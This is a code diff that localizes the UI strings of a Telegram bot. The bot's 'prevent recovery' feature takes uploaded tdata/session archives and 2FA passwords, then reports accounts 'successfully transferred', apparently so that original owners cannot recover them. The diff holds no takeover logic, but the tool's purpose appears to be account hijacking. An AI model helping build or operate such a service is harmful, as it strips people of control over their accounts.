@@ -19,6 +19,7 @@ from dotenv import load_dotenv
 from opentele.tl import TelegramClient as OpenteleClient
 from opentele.api import API
 from opentele.td import TDesktop
+from i18n import tr, lang_from_update, get_env_i18n
 
 load_dotenv()
 logger = logging.getLogger(__name__)
@@ -154,9 +155,9 @@ def create_proxy_dict(proxy):
         'rdns': True
     }
 
-def create_back_button():
+def create_back_button(lang="zh"):
     return InlineKeyboardButton(
-        "返回主菜单",
+        tr("back_to_main", lang),
         callback_data="back_to_main"
     ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}
 
@@ -300,12 +301,13 @@ async def show_prevent_recovery(update: Update, context: ContextTypes.DEFAULT_TY
     query = update.callback_query
     user_id = str(query.from_user.id)
     await query.answer()
+    lang = lang_from_update(update)
 
-    keyboard = [[create_back_button()]]
+    keyboard = [[create_back_button(lang=lang)]]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await query.edit_message_text(
-        text=PREVENT_RECOVERY_BACK,
+        text=get_env_i18n("PREVENT_RECOVERY_BACK", lang),
         parse_mode=ParseMode.HTML,
         reply_markup=reply_markup
     )
@@ -313,18 +315,19 @@ async def show_prevent_recovery(update: Update, context: ContextTypes.DEFAULT_TY
 
 async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
     document = update.message.document
+    lang = lang_from_update(update)
 
     if not document.file_name.endswith('.zip'):
         await update.message.reply_text(
-            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
+            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> " + tr("err.zip_required", lang),
             parse_mode='HTML',
-            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
+            reply_markup=InlineKeyboardMarkup([[create_back_button(lang=lang)]])
         )
         user_recovery_states.pop(user_id, None)
         return
 
     status_msg = await update.message.reply_text(
-        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
+        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> " + tr("err.processing", lang),
         parse_mode='HTML'
     )
 
@@ -338,7 +341,7 @@ async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT
         await file.download_to_drive(zip_path)
 
         await status_msg.edit_text(
-            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 正在解压并提取账号...",
+            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> " + tr("recovery.extracting", lang),
             parse_mode='HTML'
         )
 
@@ -367,15 +370,15 @@ async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT
             tdata_dirs = find_tdata_folders(extract_dir)
             if not tdata_dirs:
                 await update.message.reply_text(
-                    "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session或tdata文件夹",
+                    "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> " + tr("err.no_session_tdata", lang),
                     parse_mode='HTML',
-                    reply_markup=InlineKeyboardMarkup([[create_back_button()]])
+                    reply_markup=InlineKeyboardMarkup([[create_back_button(lang=lang)]])
                 )
                 user_recovery_states.pop(user_id, None)
                 return
 
             await status_msg.edit_text(
-                f"<tg-emoji emoji-id='5839200986022812209'>🔄</tg-emoji> 检测到 {len(tdata_dirs)} 个tdata，正在转换...",
+                f"<tg-emoji emoji-id='5839200986022812209'>🔄</tg-emoji> {tr('recovery.tdata_detected', lang)} {len(tdata_dirs)} {tr('recovery.tdata_unit', lang)}",
                 parse_mode='HTML'
             )
 
@@ -412,9 +415,9 @@ async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT
 
             if not session_files:
                 await update.message.reply_text(
-                    "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 所有tdata转换失败，无法继续",
+                    "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> " + tr("err.all_tdata_failed", lang),
                     parse_mode='HTML',
-                    reply_markup=InlineKeyboardMarkup([[create_back_button()]])
+                    reply_markup=InlineKeyboardMarkup([[create_back_button(lang=lang)]])
                 )
                 user_recovery_states.pop(user_id, None)
                 return
@@ -427,15 +430,15 @@ async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT
         }
 
         keyboard = [
-            [InlineKeyboardButton("跳过2FA", callback_data="recovery_skip_2fa")],
-            [create_back_button()]
+            [InlineKeyboardButton(tr("recovery.skip_2fa", lang), callback_data="recovery_skip_2fa")],
+            [create_back_button(lang=lang)]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
         await update.message.reply_text(
-            f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 已提取 {len(session_files)} 个账号
+            f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> {tr('recovery.extracted', lang)} {len(session_files)} {tr('recovery.accounts_unit', lang)}
 
-<tg-emoji emoji-id="6005570495603282482">🔐</tg-emoji> 请发送2FA密码（如果没有2FA，请点击“跳过2FA”按钮）：""",
+<tg-emoji emoji-id="6005570495603282482">🔐</tg-emoji> {tr('recovery.ask_2fa', lang)}""",
             parse_mode='HTML',
             reply_markup=reply_markup
         )
@@ -444,9 +447,9 @@ async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT
 
     except Exception as e:
         await update.message.reply_text(
-            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
+            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> {tr('err.process_failed', lang)}: {str(e)}",
             parse_mode='HTML',
-            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
+            reply_markup=InlineKeyboardMarkup([[create_back_button(lang=lang)]])
         )
         user_recovery_states.pop(user_id, None)
         try:
@@ -461,13 +464,14 @@ async def handle_recovery_skip(update: Update, context: ContextTypes.DEFAULT_TYP
     query = update.callback_query
     user_id = str(query.from_user.id)
     await query.answer()
+    lang = lang_from_update(update)
 
     state_info = user_recovery_states.get(user_id)
     if not state_info or state_info.get("state") != "waiting_2fa":
         await query.edit_message_text(
-            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 会话已过期，请重新开始",
+            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> " + tr("recovery.expired", lang),
             parse_mode='HTML',
-            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
+            reply_markup=InlineKeyboardMarkup([[create_back_button(lang=lang)]])
         )
         return
 
@@ -476,6 +480,7 @@ async def handle_recovery_skip(update: Update, context: ContextTypes.DEFAULT_TYP
 async def handle_recovery_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     text = update.message.text.strip()
+    lang = lang_from_update(update)
 
     state_info = user_recovery_states.get(user_id)
     if not state_info or state_info.get("state") != "waiting_2fa":
@@ -487,6 +492,7 @@ async def process_recovery_task(update: Update, context: ContextTypes.DEFAULT_TY
     state_info = user_recovery_states.pop(user_id, None)
     if not state_info:
         return
+    lang = lang_from_update(update)
 
     session_files = state_info["session_files"]
     extract_dir = state_info["extract_dir"]
@@ -494,10 +500,10 @@ async def process_recovery_task(update: Update, context: ContextTypes.DEFAULT_TY
 
     status_msg = await context.bot.send_message(
         chat_id=update.effective_chat.id,
-        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>防止找回任务开始</b>
+        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>{tr('recovery.start', lang)}</b>
 
-总账号数: {len(session_files)}
-<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> 正在处理，请稍候...""",
+{tr('recovery.total_accounts', lang)}: {len(session_files)}
+<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> {tr('recovery.processing', lang)}""",
         parse_mode='HTML'
     )
 
@@ -523,17 +529,17 @@ async def process_recovery_task(update: Update, context: ContextTypes.DEFAULT_TY
 
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text=f"<tg-emoji emoji-id='5778527486270770928'>⚠️</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)，但已完成的账号会继续发送",
+            text=f"<tg-emoji emoji-id='5778527486270770928'>⚠️</tg-emoji> {tr('recovery.timeout_msg', lang)} ({MAX_TASK_TIME}{tr('recovery.seconds', lang)})",
             parse_mode='HTML',
-            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
+            reply_markup=InlineKeyboardMarkup([[create_back_button(lang=lang)]])
         )
 
     except Exception as e:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行失败: {str(e)}",
+            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> {tr('recovery.failed', lang)}: {str(e)}",
             parse_mode='HTML',
-            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
+            reply_markup=InlineKeyboardMarkup([[create_back_button(lang=lang)]])
         )
     finally:
         try:
@@ -549,6 +555,7 @@ async def process_recovery_task(update: Update, context: ContextTypes.DEFAULT_TY
         user_recovery_states.pop(user_id, None)
 
 async def _process_recovery_internal(update, context, user_id, session_files, extract_dir, two_fa, status_msg, result_temp):
+    lang = lang_from_update(update)
     success_dir = os.path.join(result_temp, "success")
     failed_dir = os.path.join(result_temp, "failed")
     os.makedirs(success_dir)
@@ -561,11 +568,11 @@ async def _process_recovery_internal(update, context, user_id, session_files, ex
     for idx, session_path in enumerate(session_files, 1):
         try:
             await status_msg.edit_text(
-                f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>防止找回任务进行中</b>
+                f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>{tr('recovery.in_progress', lang)}</b>
 
-进度: {idx}/{len(session_files)}
-成功: {success_count} | 失败: {failed_count}
-<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> 正在处理 {os.path.basename(session_path)}...""",
+{tr('shaihuo.progress', lang)}: {idx}/{len(session_files)}
+{tr('shaihuo.success', lang)}: {success_count} | {tr('2fa.failed', lang)}: {failed_count}
+<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> {tr('recovery.processing', lang)} {os.path.basename(session_path)}...""",
                 parse_mode='HTML'
             )
         except:
@@ -640,11 +647,11 @@ async def _process_recovery_internal(update, context, user_id, session_files, ex
                     arcname = os.path.relpath(file_path, failed_dir)
                     zipf.write(file_path, arcname)
 
-    result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>防止找回任务完成</b>
+    result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>{tr('recovery.done', lang)}</b>
 
-总账号: {len(session_files)}
-<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: {success_count}
-<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: {failed_count}"""
+{tr('recovery.total_accounts', lang)}: {len(session_files)}
+<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> {tr('shaihuo.success', lang)}: {success_count}
+<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> {tr('2fa.failed', lang)}: {failed_count}"""
 
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
@@ -658,7 +665,7 @@ async def _process_recovery_internal(update, context, user_id, session_files, ex
                 chat_id=update.effective_chat.id,
                 document=f,
                 filename=f"recovery_success_{timestamp}.zip",
-                caption=f"<b>成功转移的账号 ({success_count}个)</b>",
+                caption=f"<b>{tr('recovery.success_caption', lang)} ({success_count}{tr('recovery.accounts_unit', lang)})</b>",
                 parse_mode='HTML'
             )
 
@@ -668,7 +675,7 @@ async def _process_recovery_internal(update, context, user_id, session_files, ex
                 chat_id=update.effective_chat.id,
                 document=f,
                 filename=f"recovery_failed_{timestamp}.zip",
-                caption=f"<b>失败的账号 ({failed_count}个)</b>",
+                caption=f"<b>{tr('recovery.failed_caption', lang)} ({failed_count}{tr('recovery.accounts_unit', lang)})</b>",
                 parse_mode='HTML'
             )
 
@@ -680,11 +687,11 @@ async def _process_recovery_internal(update, context, user_id, session_files, ex
             try:
                 await context.bot.send_message(
                     chat_id=admin,
-                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>防止找回任务完成</b>
+                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>{tr('recovery.done', lang)}</b>
 
-用户: <code>{user_id}</code>
-总账号: {len(session_files)}
-<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} |<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: {failed_count}""",
+{tr('admin.user', lang)}: <code>{user_id}</code>
+{tr('recovery.total_accounts', lang)}: {len(session_files)}
+<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>{tr('shaihuo.success', lang)}: {success_count} |<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> {tr('2fa.failed', lang)}: {failed_count}""",
                     parse_mode='HTML'
                 )
                 if success_zip:
